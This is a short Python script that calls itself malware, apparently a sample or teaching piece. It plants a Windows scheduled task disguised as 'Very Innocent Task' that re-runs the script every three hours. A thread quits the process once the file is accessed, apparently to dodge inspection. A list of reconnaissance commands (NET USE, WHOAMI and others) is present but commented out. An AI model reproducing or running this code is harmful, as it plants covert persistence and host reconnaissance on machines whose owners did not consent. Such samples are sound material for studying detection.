import os
import time
import threading


def check_file_accessed(start, file_path):
    while True:
        last_accessed = os.stat(file_path).st_atime

        # Checks whether the file was accessed after the was script started
        if start < last_accessed:
            print(last_accessed)
            os._exit(0)


def main():
    start = time.time()
    file_path = __file__
    print(f"Malware started running at: {time.ctime(start)}")

    # Runing in parallel to check all the time if file was accessed
    t = threading.Thread(target=check_file_accessed, args=[start, file_path])
    t.start()

    # Reconnaissance commands
    commands = ["NET USE", "NET GROUP", "NETSH", "IPCONFIG", "WHOAMI"]
    #[os.system(command) for command in commands]

    sctask_cmd = f'schtasks /create /sc hourly /mo 3 /tn "Very Innocent Task" /tr "python {__file__}"'
    os.system(sctask_cmd)


if __name__ == "__main__":
    main()
